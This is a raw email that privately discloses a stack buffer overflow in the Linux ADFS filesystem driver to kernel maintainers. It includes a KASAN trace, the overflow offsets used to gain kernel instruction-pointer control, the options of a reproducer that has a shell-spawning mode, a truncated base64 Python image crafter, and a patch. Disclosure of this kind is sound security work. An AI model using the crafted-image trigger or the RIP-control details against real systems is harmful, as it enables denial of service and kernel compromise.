Received: from mail-ot1-f51.google.com (mail-ot1-f51.google.com [209.85.210.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5DC60302163
	for <linux-fsdevel@vger.kernel.org>; Sat,  1 Aug 2026 02:15:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.51
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785550550; cv=pass; b=MkKjKcsEeVyitGtNyDfBP+2P6FqulBr4IWZ9NUEcVy2nYomKCDI0ZdSKqdudSQ6fbyRZPVFxk37ZqIPx3HAm+8Cm4+kO6f3kLPdStoD881meMjNygKqjYgFgOBHDNn6NSBHRJwfd5xPiJFPngHI9m/xpGDSqXBf+d/vxf8TAeK8=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785550550; c=relaxed/simple;
	bh=HWvYVqOtijXtHKB5ryYT84H/hlCTENzrJBafrdtmDL4=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=FkjihH2gpseutcEwB1ExqJ+QTQ2VPagu8x8FHs4neplsXnWgwscJDau3sgSGs+9W4cSlxM7SkkzWNRFWfPzxWzHmqSNg3CfGzt8RfALtsYYdfDwksxbz3MEmWLu8wLU7VOapgY6X6maJUxy/6ZCB0szjxMYvIKMff3ceSY6vpF4=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zerotracelab.com; spf=pass smtp.mailfrom=zerotracelab.com; dkim=pass (2048-bit key) header.d=zerotracelab-com.20251104.gappssmtp.com header.i=@zerotracelab-com.20251104.gappssmtp.com header.b=dzqTSbiX; arc=pass smtp.client-ip=209.85.210.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=zerotracelab.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=zerotracelab.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=zerotracelab-com.20251104.gappssmtp.com header.i=@zerotracelab-com.20251104.gappssmtp.com header.b="dzqTSbiX"
Received: by mail-ot1-f51.google.com with SMTP id 46e09a7af769-7e9d7464b71so766433a34.0
        for <linux-fsdevel@vger.kernel.org>; Fri, 31 Jul 2026 19:15:47 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785550546; cv=none;
        d=google.com; s=arc-20260327;
        b=YXoXR2i68DToLx0oAbx0L6KlwpDGx/DE65jIH1SZE1arWhxx+tYaryBG/dVL+TAn1q
         tPb7nZtaayA5mBUPNRMTA3ZAqlUyGW39AO/TcGBImGJie8fq1/KDKm3R2wqCt3KghTLs
         Lu6YBwvqYPsacEFCzVbOcaoMKjfMjCUoWerAM9Oi0JbLDuvCeQW5xWfaC525WBU1so+C
         CSrfvQ6sLwfJpHY6eEHNJLzLmtnzbDL0L5/8m9JTVJOu8DknFIY1Q6Cf7v1DrzEpU53P
         YiphiM4LioDfkcxq3ewGijDE3mm6T9hZ/9ef+MWbb0mWIBNniMHJp4+LyIM3p+vrWbEf
         CPvQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
        fh=S/KIHUDI/zKVsLFQHB7cOpzlU4XWa4bARjWLBOEkIvg=;
        b=iC+w5vvlUH5ksipcjIF62HE21OrhtAuhapPKDDZaSm63YcbteEOWFQ7L7x7Ym2Mwz4
         r1+VsnZIUO6nUHIOqqteHI2kC9+MCZvxaVaBKuEVaZICgJ1+oHeu8ilPkDWxYXXCrnRE
         VqeXs2xjkEAcuiRld4ASXYeSG4ah3IBmZ7/NBDIngiCfWhK9hlzwyMbYsqKGU4RCxViE
         CDVrGQUHCOrgKN8AWT8wOxbFUBCT/vID7n332oArSyi1YTZCqKh9oju8mqT2pi855MTa
         6ALSfFfFVstjmDJXR7jBgKu1gSOwdq7mjjGn0pm8Nw9K0zf6igzbNDj1UOgLTrFsU8pY
         agrA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=zerotracelab-com.20251104.gappssmtp.com; s=20251104; t=1785550546; x=1786155346; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
        b=dzqTSbiXnf/TuPiJOkwu5Evc9L4jJXDHQuZned05goWuVLuMFfUDd02V3w47/61jTo
         C/3TSdcPTR3n/XJb8pNE3KAykRcGZgGvULhZ1RGob6lJvH3IGRgYTHHt+pZqWii0bX+j
         DMEMxKrnBiwym3huA1ETd5DaJxexZZjukb2vpfjX40Nt72CeP9cDWCUcK0Rq1KaYuSyM
         TMCum4XTNXsKGsGDsL11gbg0y0ws5lT2hAOJL+mwKz0NLOuTjkM7aqVSrt4d85gX8Nbo
         KE8YEybWfHSjIhxJZ+xcDjmm+8XVGJAnBsRZ7rD9lSkJWl1SXP5afMH6SiW4xeHgkNdM
         TjQg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785550546; x=1786155346;
        h=content-type:cc:to:subject:message-id:date:from:mime-version
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=MQzgt55M/+pKI4cZq2xrOa5CKn0QYw5GC6WFz76+6aU=;
        b=phR8PX/3dqlchWiPlHZVFRsSRAghgl57wZFAj06CiB0pfABDaAK6cFWBxLrlvw5if3
         8QzugkF5wHNPoRgMoc1ZfPR9oRFBAfBNB9HBUAXh8u7pLhTA/d5WYXcq3BGB3+iS3OcB
         rgzdtxUlRAW/L2iCTSmpwuJkyX/M4RzrYvzrU581Mj+31Lp0pRfDZFDXJ7gqg6YWRflq
         k8bdFZDRA7lzbeq0Db9XWlI4WcfJXFwVBu+9txiz6Noz39OXz/YqVbXnK1oL+1Fwwy0M
         Ki0ORR3CdC+sobpht7X5z3I6AJ+FXfLqDUPvYL/irgwiwaSww86w0cQkZyD6uoUSkaIK
         6mIg==
X-Gm-Message-State: AOJu0YyYWapSGkUrZG/8MvQxv8HusYuNObME4Q2uKJAtiQJDvgZlHD3x
	9nkyI5EqHHuUJxe3QPOpVhFHKD0Zv2mqOGcvDM1QFwXay/nU7Qd8QipJups9g6L9Z1YGJkEkoP0
	cXBtDENLyD86rzJAzsCOmq2OW+tQcQ0XeZwGA64OZ3Wo=
X-Gm-Gg: AR+sD12J7p+h/JMAB05Quiexqz4Z5rxiM3gm1xvn/blelbDVclQll6m0c1FQrCmrTxT
	ySYItCWyAUW4mw73MADqMjA2zJyHMi+hUMGLaHlBB+zy+MoRyuoPeJAA5z3wPChhUb5eZQfvcIj
	Ut2NM9ySvzMygwH+6FFeH0g1HZ5dJv6twgS4Ojdq948T1Rv+UJmFn6iuk9zh1n7hhqkCTQGNM8Q
	5W0ek/A0E+xEWVI4zzogUjri1ddxZ/6oe7mlR3naa64sbP6RjO2lQpNfGhg5vfYjiCmqp3xAfoX
	vcAg7OmEVJ/DhkpN6dittlPzUgaeHig8IuGk4z8jL4eROiw=
X-Received: by 2002:a05:6808:2289:b0:497:df42:1e04 with SMTP id
 5614622812f47-4af5e2a0104mr4545674b6e.18.1785550545937; Fri, 31 Jul 2026
 19:15:45 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: "Research & Development" <research@zerotracelab.com>
Date: Fri, 31 Jul 2026 22:15:33 -0400
X-Gm-Features: AUfX_mz3U1gGoSP6Qo14JiMEeWw3Bo8LIw12imq8o735aCTCAhhQWbz26XiospQ
Message-ID: <CAGpo96PO4DPJJZtRj9vnR-ZzcWwv=oHyfM7i2Ug+A_CjR3z4+A@mail.gmail.com>
Subject: adfs: stack buffer overflow in adfs_fplus_getnext() (F+ big-directory)
To: "viro@zeniv.linux.org.uk" <viro@zeniv.linux.org.uk>, brauner@kernel.org
Cc: linux-fsdevel@vger.kernel.org, security@kernel.org
Content-Type: multipart/mixed; boundary="0000000000000542c90657f2e235"

--0000000000000542c90657f2e235
Content-Type: multipart/alternative; boundary="0000000000000542c80657f2e233"

--0000000000000542c80657f2e233
Content-Type: text/plain; charset="UTF-8"

Hi Security Team,

I am reporting a security vulnerability in the ADFS filesystem driver
(fs/adfs/dir_fplus.c), which is maintained under the FILESYSTEMS (VFS)
entry. It is unfixed in mainline (v7.2-rc5) and, as far as I can tell, in
all supported stable branches. I am reporting privately per documentation
process. A tested reproducer and a tested one-line fix are included below.
I am happy to coordinate and would like a CVE assigned once a fix is
applied.


1. AFFECTED VERSION RANGE
-------------------------
Present since the 2020 ADFS big-directory rework (~v5.6);
fs/adfs/dir_fplus.c
was last touched on 2020-01-25 (587065d) and is unchanged since.

  Vulnerable, reproduced:      v7.0.1
  Vulnerable, code-identical:  mainline v7.2-rc5
  Affected:                    v5.6 -> v7.2-rc5
(5.10/5.15/6.1/6.6/6.12/6.18/7.0/7.1/7.2-rc)

I verified the vulnerable sequence is byte-for-byte identical in current
mainline (adfs_fplus_getnext() + adfs_fplus_validate_header()).
CONFIG_ADFS_FS is shipped as a module on typical distros (confirmed:
adfs.ko present under /lib/modules on a 6.18 kernel).


2. DESCRIPTION
--------------
adfs_fplus_getnext() (fs/adfs/dir_fplus.c) reads the per-entry name length
field bigdirobnamelen (an unvalidated __le32, struct adfs_bigdirentry) and
uses it directly as the copy length into struct object_info.name, which is
char[ADFS_MAX_NAME_LEN] = char[260] (fs/adfs/adfs.h). struct object_info is
held on the caller's stack -- adfs_fplus_iterate() declares it locally
(dir_fplus.c:212); adfs_lookup() uses the same on-stack pattern
(dir.c:434). adfs_fplus_validate_header() checks only AGGREGATE sizes
(directory name length, total names area, entries*stride); it never bounds
the per-entry bigdirobnamelen. adfs_dir_copyfrom() bounds the source only
against dir->nr_buffers, never against the destination.

Therefore a crafted ADFS F+ image whose entry has bigdirobnamelen > 260
overflows obj->name on the kernel stack. The path is reached when the
directory is enumerated (readdir/getdents64) or an entry is looked up, on a
mounted image.

Relevant code (dir_fplus.c):

    obj->name_len = le32_to_cpu(bde.bigdirobnamelen);          /* unbounded
*/
    ...
    ret = adfs_dir_copyfrom(obj->name, dir, offset, obj->name_len);  /*
OVERFLOW */

Trace (KASAN build, real mount + ls, by task ls):

    BUG: KASAN: stack-out-of-bounds in adfs_object_fixup+0xa2/0x40f
    Read of size 1 ... by task ls/31
    Call Trace:
     adfs_object_fixup+0xa2/0x40f
     adfs_fplus_getnext+0x403/0x477
     adfs_fplus_iterate+0x186/0x26e
     iterate_dir ... sys_getdents64
    The vulnerable address belongs to stack of task ls and is located at
offset 320 in frame adfs_fplus_iterate; this frame has 1 object: [32, 320)
'obj' (offset 320 == obj->name[260]).

IMPACT. Two outcomes depending on build hardening:

  - Hardened kernel (CONFIG_STACKPROTECTOR_STRONG, distro default): the
frame has a canary. The overflow trips __stack_chk_fail -> reliable kernel
panic (denial of service).
  - Un-canaried build (e.g. custom/embedded, or a KASAN/fuzz build): the
saved return address of adfs_fplus_iterate is within reach. I demonstrated
arbitrary kernel instruction-pointer control, trimming the overflow to 388
bytes overwrites the saved return address (obj->name[380..388]) while
leaving the caller's struct adfs_dir intact, and execution reaches a clean
ret. Planting 0xffffffff43434343 there makes the kernel fault at exactly
that IP (Kernel panic ... ip 0xffffffff43434343). A non-canonical value
faults at the ret instruction (adfs_fplus_iterate+0x26d). So on such builds
this is kernel code execution.

REACHABILITY / SCOPE : ADFS is a local block filesystem (only
register_filesystem + FS_REQUIRES_DEV no network parser), so it is NOT
remotely triggerable. Mounting requires CAP_SYS_ADMIN; adfs has no
FS_USERNS_MOUNT, so unprivileged user-namespace mount is blocked, i.e. it
is not an unprivileged no preconditions LPE. It becomes a real LPE/kernel
compromise only on un-canaried builds where a privileged context mounts an
attacker image (root in container that can mount, a VM/storage host
attaching untrusted images, or removable-media auto-mount where libblkid
recognises ADFS).

I also verified, on a representative host, that libblkid does not even list
ADFS, so udisks auto-mount is closed there the practical default-distro
outcome is DoS, not LPE.


3. REPRODUCER
-------------
A python file is attached. It builds a 16 KiB ADFS F+ image by hand
(correct disc record, zone check and bigdir checkbyte so it mounts cleanly)
with bigdirobnamelen = 512, then either boots a UML/KASAN kernel
(safe, default) or mounts on the host. It can be executed with following
arguments:
    python3 test_adfs_overflow.py            # craft + KASAN detect; exit 1
== vulnerable
    python3 test_adfs_overflow.py --rip      # demonstrate RIP control
(un-canaried)
    python3 test_adfs_overflow.py --craft-only out.img
    python3 test_adfs_overflow.py --sh # executing the bash shell
The script is a standalone crafter, the RIP variant and the captured
KASAN/RIP logs are available on request. Output of the default run against
v7.0.1 (UML/KASAN):

    ==== DETECTION SIGNALS ====
      mount_ok    = True
      kasan       = True
      adfs_hits   =
['adfs_object_fixup','adfs_fplus_getnext','adfs_fplus_iterate']
      obj_frame   = True
      panic       = True
      controlled  = True
      RESULT: VULNERABLE -- confirmed ADFS dir_fplus stack overflow.

And with --rip on the same (un-canaried) build:

      fault_ip      = 0xffffffff43434343
      canonical_hit = True
      RESULT: RIP CONTROL DEMONSTRATED.


4. CONDITIONS
-------------
- CONFIG_ADFS_FS built-in or module-loaded.
- Triggered by readdir/getdents or name lookup on a mounted image. Mount
needs CAP_SYS_ADMIN.
- For the KASAN detection signal: CONFIG_KASAN=y (+ CONFIG_KASAN_STACK=y).
- For the RIP-control primitive: the affected frame must lack a stack
canary (no CONFIG_STACKPROTECTOR, or a fuzz/KASAN build). On
CONFIG_STACKPROTECTOR_STRONG builds the outcome is the DoS case above.


5. PROPOSED FIX (inline tested patch, applies cleanly on v7.2-rc5)
-------------------------------------------------------------------
Bound bigdirobnamelen against the destination buffer before the copy. This
stops both the KASAN overflow and the RIP-control variant (a
bigdirobnamelen of 512 or 388 is rejected with -EIO before the copy). I can
add a second change to adfs_fplus_validate_header() to validate per-entry
name pointers up front if preferred.

[PATCH] adfs: bound big-directory entry name length in adfs_fplus_getnext()

Bound bigdirobnamelen against ADFS_MAX_NAME_LEN before the copy.

---
 fs/adfs/dir_fplus.c | 2 ++
 1 file changed, 2 insertions(+)

diff --git a/fs/adfs/dir_fplus.c b/fs/adfs/dir_fplus.c
--- a/fs/adfs/dir_fplus.c
+++ b/fs/adfs/dir_fplus.c
@@ -192,6 +192,8 @@
  obj->indaddr  = le32_to_cpu(bde.bigdirindaddr);
  obj->attr     = le32_to_cpu(bde.bigdirattr);
  obj->name_len = le32_to_cpu(bde.bigdirobnamelen);
+ if (obj->name_len > ADFS_MAX_NAME_LEN)
+ return -EIO;

  offset = adfs_fplus_offset(h, le32_to_cpu(h->bigdirentries));
  offset += le32_to_cpu(bde.bigdirobnameptr);
----


I'd be grateful if you could confirm receipt and on request a CVE via
cve@kernel.org once the fix is in a stable tree. I will not discuss this
publicly or with linux-distros until a fix is accepted.

Thanks and Regards,
Tridev
Vulnerability Researcher
Zerotrace Lab

--0000000000000542c80657f2e233
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">Hi Security Team,<br><br>I am reporting a security vulnera=
bility in the ADFS filesystem driver (fs/adfs/dir_fplus.c), which is mainta=
ined under the FILESYSTEMS (VFS) entry. It is unfixed in mainline (v7.2-rc5=
) and, as far as I can tell, in all supported stable branches. I am reporti=
ng privately per documentation process. A tested reproducer and a tested on=
e-line fix are included below. I am happy to coordinate and would like a CV=
E assigned once a fix is applied.<br><br><br>1. AFFECTED VERSION RANGE<br>-=
------------------------<br>Present since the 2020 ADFS big-directory rewor=
k (~v5.6); fs/adfs/dir_fplus.c<br>was last touched on 2020-01-25 (587065d) =
and is unchanged since.<br><br>=C2=A0 Vulnerable, reproduced: =C2=A0 =C2=A0=
 =C2=A0v7.0.1<br>=C2=A0 Vulnerable, code-identical: =C2=A0mainline v7.2-rc5=
<br>=C2=A0 Affected: =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0v5.6 -&gt; v7.2-rc5 (5.10/5.15/6.1/6.6/6.12/6.18/7.0/7.1/7=
.2-rc)<br>=C2=A0 <br>I verified the vulnerable sequence is byte-for-byte id=
entical in current mainline (adfs_fplus_getnext() + adfs_fplus_validate_hea=
der()). CONFIG_ADFS_FS is shipped as a module on typical distros (confirmed=
: adfs.ko present under /lib/modules on a 6.18 kernel).<br><br><br>2. DESCR=
IPTION<br>--------------<br>adfs_fplus_getnext() (fs/adfs/dir_fplus.c) read=
s the per-entry name length field bigdirobnamelen (an unvalidated __le32, s=
truct adfs_bigdirentry) and uses it directly as the copy length into struct=
 <a href=3D"http://object_info.name">object_info.name</a>, which is char[AD=
FS_MAX_NAME_LEN] =3D char[260] (fs/adfs/adfs.h). struct object_info is held=
 on the caller&#39;s stack -- adfs_fplus_iterate() declares it locally (dir=
_fplus.c:212); adfs_lookup() uses the same on-stack pattern (dir.c:434). ad=
fs_fplus_validate_header() checks only AGGREGATE sizes (directory name leng=
th, total names area, entries*stride); it never bounds the per-entry bigdir=
obnamelen. adfs_dir_copyfrom() bounds the source only against dir-&gt;nr_bu=
ffers, never against the destination.<br><br>Therefore a crafted ADFS F+ im=
age whose entry has bigdirobnamelen &gt; 260 overflows obj-&gt;name on the =
kernel stack. The path is reached when the directory is enumerated (readdir=
/getdents64) or an entry is looked up, on a mounted image.<br><br>Relevant =
code (dir_fplus.c):<br><br>=C2=A0 =C2=A0 obj-&gt;name_len =3D le32_to_cpu(b=
de.bigdirobnamelen); =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0/* unbounded */<br>=
=C2=A0 =C2=A0 ...<br>=C2=A0 =C2=A0 ret =3D adfs_dir_copyfrom(obj-&gt;name, =
dir, offset, obj-&gt;name_len); =C2=A0/* OVERFLOW */<br><br>Trace (KASAN bu=
ild, real mount + ls, by task ls):<br><br>=C2=A0 =C2=A0 BUG: KASAN: stack-o=
ut-of-bounds in adfs_object_fixup+0xa2/0x40f<br>=C2=A0 =C2=A0 Read of size =
1 ... by task ls/31<br>=C2=A0 =C2=A0 Call Trace:<br>=C2=A0 =C2=A0 =C2=A0adf=
s_object_fixup+0xa2/0x40f<br>=C2=A0 =C2=A0 =C2=A0adfs_fplus_getnext+0x403/0=
x477<br>=C2=A0 =C2=A0 =C2=A0adfs_fplus_iterate+0x186/0x26e<br>=C2=A0 =C2=A0=
 =C2=A0iterate_dir ... sys_getdents64<br>=C2=A0 =C2=A0 The vulnerable addre=
ss belongs to stack of task ls and is located at offset 320 in frame adfs_f=
plus_iterate; this frame has 1 object: [32, 320) &#39;obj&#39; (offset 320 =
=3D=3D obj-&gt;name[260]).<br><br>IMPACT. Two outcomes depending on build h=
ardening:<br><br>=C2=A0 - Hardened kernel (CONFIG_STACKPROTECTOR_STRONG, di=
stro default): the frame has a canary. The overflow trips __stack_chk_fail =
-&gt; reliable kernel panic (denial of service).<br>=C2=A0 - Un-canaried bu=
ild (e.g. custom/embedded, or a KASAN/fuzz build): the saved return address=
 of adfs_fplus_iterate is within reach. I demonstrated arbitrary kernel ins=
truction-pointer control, trimming the overflow to 388 bytes overwrites the=
 saved return address (obj-&gt;name[380..388]) while leaving the caller&#39=
;s struct adfs_dir intact, and execution reaches a clean ret. Planting 0xff=
ffffff43434343 there makes the kernel fault at exactly that IP (Kernel pani=
c ... ip 0xffffffff43434343). A non-canonical value faults at the ret instr=
uction (adfs_fplus_iterate+0x26d). So on such builds this is kernel code ex=
ecution.<br><br>REACHABILITY / SCOPE : ADFS is a local block filesystem (on=
ly register_filesystem + FS_REQUIRES_DEV no network parser), so it is NOT r=
emotely triggerable. Mounting requires CAP_SYS_ADMIN; adfs has no FS_USERNS=
_MOUNT, so unprivileged user-namespace mount is blocked, i.e. it is not an =
unprivileged no preconditions LPE. It becomes a real LPE/kernel compromise =
only on un-canaried builds where a privileged context mounts an attacker im=
age (root in container that can mount, a VM/storage host attaching untruste=
d images, or removable-media auto-mount where libblkid recognises ADFS).<br=
><br>I also verified, on a representative host, that libblkid does not even=
 list ADFS, so udisks auto-mount is closed there the practical default-dist=
ro outcome is DoS, not LPE.<br><br><br>3. REPRODUCER<br>-------------<br>A =
python file is attached. It builds a 16 KiB ADFS F+ image by hand (correct =
disc record, zone check and bigdir checkbyte so it mounts cleanly) with big=
dirobnamelen =3D 512, then either boots a UML/KASAN kernel<br>(safe, defaul=
t) or mounts on the host. It can be executed with following arguments:<br>=
=C2=A0 =C2=A0 python3 test_adfs_overflow.py =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0# craft + KASAN detect; exit 1 =3D=3D vulnerable<br>=C2=A0 =C2=A0=
 python3 test_adfs_overflow.py --rip =C2=A0 =C2=A0 =C2=A0# demonstrate RIP =
control (un-canaried)<br>=C2=A0 =C2=A0 python3 test_adfs_overflow.py --craf=
t-only out.img<br>=C2=A0 =C2=A0 python3 test_adfs_overflow.py --sh # execut=
ing the bash shell<br>The script is a standalone crafter, the RIP variant a=
nd the captured KASAN/RIP logs are available on request. Output of the defa=
ult run against v7.0.1 (UML/KASAN):<br><br>=C2=A0 =C2=A0 =3D=3D=3D=3D DETEC=
TION SIGNALS =3D=3D=3D=3D<br>=C2=A0 =C2=A0 =C2=A0 mount_ok =C2=A0 =C2=A0=3D=
 True<br>=C2=A0 =C2=A0 =C2=A0 kasan =C2=A0 =C2=A0 =C2=A0 =3D True<br>=C2=A0=
 =C2=A0 =C2=A0 adfs_hits =C2=A0 =3D [&#39;adfs_object_fixup&#39;,&#39;adfs_=
fplus_getnext&#39;,&#39;adfs_fplus_iterate&#39;]<br>=C2=A0 =C2=A0 =C2=A0 ob=
j_frame =C2=A0 =3D True<br>=C2=A0 =C2=A0 =C2=A0 panic =C2=A0 =C2=A0 =C2=A0 =
=3D True<br>=C2=A0 =C2=A0 =C2=A0 controlled =C2=A0=3D True<br>=C2=A0 =C2=A0=
 =C2=A0 RESULT: VULNERABLE -- confirmed ADFS dir_fplus stack overflow.<br><=
br>And with --rip on the same (un-canaried) build:<br><br>=C2=A0 =C2=A0 =C2=
=A0 fault_ip =C2=A0 =C2=A0 =C2=A0=3D 0xffffffff43434343<br>=C2=A0 =C2=A0 =
=C2=A0 canonical_hit =3D True<br>=C2=A0 =C2=A0 =C2=A0 RESULT: RIP CONTROL D=
EMONSTRATED.<br><br><br>4. CONDITIONS<br>-------------<br>- CONFIG_ADFS_FS =
built-in or module-loaded.<br>- Triggered by readdir/getdents or name looku=
p on a mounted image. Mount needs CAP_SYS_ADMIN.<br>- For the KASAN detecti=
on signal: CONFIG_KASAN=3Dy (+ CONFIG_KASAN_STACK=3Dy).<br>- For the RIP-co=
ntrol primitive: the affected frame must lack a stack canary (no CONFIG_STA=
CKPROTECTOR, or a fuzz/KASAN build). On CONFIG_STACKPROTECTOR_STRONG builds=
 the outcome is the DoS case above.<br><br><br>5. PROPOSED FIX (inline test=
ed patch, applies cleanly on v7.2-rc5)<br>---------------------------------=
----------------------------------<br>Bound bigdirobnamelen against the des=
tination buffer before the copy. This stops both the KASAN overflow and the=
 RIP-control variant (a bigdirobnamelen of 512 or 388 is rejected with -EIO=
 before the copy). I can add a second change to adfs_fplus_validate_header(=
) to validate per-entry name pointers up front if preferred.<br><br>[PATCH]=
 adfs: bound big-directory entry name length in adfs_fplus_getnext()<br><br=
>Bound bigdirobnamelen against ADFS_MAX_NAME_LEN before the copy.<br><br>--=
-<br>=C2=A0fs/adfs/dir_fplus.c | 2 ++<br>=C2=A01 file changed, 2 insertions=
(+)<br><br>diff --git a/fs/adfs/dir_fplus.c b/fs/adfs/dir_fplus.c<br>--- a/=
fs/adfs/dir_fplus.c<br>+++ b/fs/adfs/dir_fplus.c<br>@@ -192,6 +192,8 @@<br>=
=C2=A0	obj-&gt;indaddr =C2=A0=3D le32_to_cpu(bde.bigdirindaddr);<br>=C2=A0	=
obj-&gt;attr =C2=A0 =C2=A0 =3D le32_to_cpu(bde.bigdirattr);<br>=C2=A0	obj-&=
gt;name_len =3D le32_to_cpu(bde.bigdirobnamelen);<br>+	if (obj-&gt;name_len=
 &gt; ADFS_MAX_NAME_LEN)<br>+		return -EIO;<br><br>=C2=A0	offset =3D adfs_f=
plus_offset(h, le32_to_cpu(h-&gt;bigdirentries));<br>=C2=A0	offset +=3D le3=
2_to_cpu(bde.bigdirobnameptr);<br>----<br><br><br>I&#39;d be grateful if yo=
u could confirm receipt and on request a CVE via <a href=3D"mailto:cve@kern=
el.org">cve@kernel.org</a> once the fix is in a stable tree. I will not dis=
cuss this publicly or with linux-distros until a fix is accepted.<br><br>Th=
anks and Regards,<br>Tridev<br>Vulnerability Researcher<br>Zerotrace Lab<br=
><br><br></div>

--0000000000000542c80657f2e233--
--0000000000000542c90657f2e235
Content-Type: text/x-python; charset="UTF-8"; name="test_adfs_overflow.py"
Content-Disposition: attachment; filename="test_adfs_overflow.py"
Content-Transfer-Encoding: base64
Content-ID: <f_ms9qokqt0>
X-Attachment-Id: f_ms9qokqt0

aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQg
c3RydWN0CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKaW1wb3J0IHRlbXBmaWxlCgojID09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PQojIDEuIEltYWdlIGNyYWZ0ZXIgKHBvcnRlZCB2ZXJiYXRpbSBmcm9t
IHRoZSB2ZXJpZmllZCBwb2MvY3JhZnRfYWRmcy5weSkKIyA9PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCkJM
SyA9IDUxMgpOVU1fQkxPQ0tTID0gMzIKSU1HX1NJWkUgPSBOVU1fQkxPQ0tTICogQkxLICAgICAg
ICAgICAgIyAxNjM4NAoKTE9HMlNFQ1NJWkUgPSA5ICAgICAgICAgICAgICAgICAgICAgICAgIyA1
MTItYnl0ZSBzZWN0b3JzCklETEVOID0gMTIKTE9HMkJQTUIgPSA5ICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIyAxIG1hcCBiaXQgPT0gNTEyIGJ5dGVzClpPTkVfU1BBUkUgPSAwCk5aT05FUyA9
IDEKRk9STUFUX1ZFUlNJT04gPSAxICAgICAgICAgICAgICAgICAgICAgIyBzZWxlY3RzIGFkZnNf
ZnBsdXNfZGlyX29wcyAoRispCkxPRzJTSEFSRVNJWkUgPSAwCkRJU0NfU0laRSA9IElNR19TSVpF
ClJPT1RfSU5EREFERFIgPSAweDAwMDAwMjAwICAgICAgICAgICAgICMgZnJhZyBpZCAyICg+Pjgp
ID09IEFERlNfUk9PVF9GUkFHClJPT1RfU0laRSA9IDIwNDgKCkJJR0RJUlNUQVJUTkFNRSA9IChv
cmQoJ1MnKSB8IG9yZCgnQicpIDw8IDggfCBvcmQoJ1AnKSA8PCAxNiB8IG9yZCgncicpIDw8IDI0
KQpCSUdESVJFTkROQU1FICAgPSAob3JkKCdvJykgfCBvcmQoJ3YnKSA8PCA4IHwgb3JkKCdlJykg
PDwgMTYgfCBvcmQoJ24nKSA8PCAyNCkKCgpkZWYgX2xlMTYodik6IHJldHVybiBzdHJ1Y3QucGFj
aygnPEgnLCB2ICYgMHhGRkZGKQpkZWYgX2xlMzIodik6IHJldHVybiBzdHJ1Y3QucGFjaygnPEkn
LCB2ICYgMHhGRkZGRkZGRikKCgpkZWYgX3NldF9iaXQoYnVmLCBiaXRwb3MsIHZhbCk6CiAgICBi
aSwgYm8gPSBkaXZtb2QoYml0cG9zLCA4KQogICAgaWYgdmFsOgogICAgICAgIGJ1ZltiaV0gfD0g
KDEgPDwgYm8pCiAgICBlbHNlOgogICAgICAgIGJ1ZltiaV0gJj0gfigxIDw8IGJvKQoKCmRlZiBf
cm9yMzIodiwgbik6CiAgICBuICY9IDMxCiAgICByZXR1cm4gKCh2ID4+IG4pIHwgKHYgPDwgKDMy
IC0gbikpKSAmIDB4RkZGRkZGRkYKCgpkZWYgX2NhbGNfem9uZWNoZWNrKG0pOgogICAgIiIiUmVw
bGljYXRlIGFkZnNfY2FsY3pvbmVjaGVjayAoZnMvYWRmcy9tYXAuYykgb3ZlciBhIDUxMi1ieXRl
IHpvbmUuIiIiCiAgICB2MCA9IHYxID0gdjIgPSB2MyA9IDAKICAgIGkgPSA1MTIgLSA0CiAgICB3
aGlsZSBpOgogICAgICAgIHYwID0gKHYwICsgbVtpXSAgICAgKyAodjMgPj4gOCkpICYgMHhmZmZm
ZmZmZjsgdjMgJj0gMHhmZgogICAgICAgIHYxID0gKHYxICsgbVtpICsgMV0gKyAodjAgPj4gOCkp
ICYgMHhmZmZmZmZmZjsgdjAgJj0gMHhmZgogICAgICAgIHYyID0gKHYyICsgbVtpICsgMl0gKyAo
